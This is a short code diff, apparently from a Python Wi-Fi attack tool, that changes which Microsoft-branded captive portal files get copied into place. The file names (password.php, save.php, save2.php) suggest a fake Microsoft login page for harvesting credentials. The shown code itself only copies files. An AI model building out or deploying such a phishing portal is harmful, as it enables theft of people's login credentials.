@@ -189,8 +189,10 @@ def setup_captive_portal_files(Cap: str):
             shutil.copy("save.php", os.path.join(portal_dir, "save.php"))
         if Cap == "microsoft": 
             shutil.copy("Microsoft/index.html", os.path.join(portal_dir, "index.html"))
-            shutil.copy("Microsoft/password.html", os.path.join(portal_dir, "password.html"))
+            shutil.copy("Microsoft/password.php", os.path.join(portal_dir, "password.php"))
             shutil.copy("Microsoft/save.php", os.path.join(portal_dir, "save.php"))
+            shutil.copy("Microsoft/save2.php", os.path.join(portal_dir, "save2.php"))
+            shutil.copy("Microsoft/microsoft.svg", os.path.join(portal_dir, "microsoft.svg"))
         
         print("[+] Captive portal files copied successfully.")
     except Exception as e:
